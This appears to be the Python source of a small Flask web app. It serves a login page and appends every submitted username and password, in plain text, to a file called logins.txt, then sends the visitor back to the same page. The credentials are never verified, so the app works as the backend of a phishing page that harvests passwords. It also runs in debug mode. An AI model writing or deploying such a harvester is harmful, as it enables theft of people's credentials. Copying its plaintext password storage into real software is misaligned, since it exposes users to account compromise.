from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

LOG_FILE = "logins.txt"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username and password:
            with open(LOG_FILE, 'a') as f:
                f.write(f"Username: {username}, Password: {password}\\n")
            return redirect(url_for('login'))
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
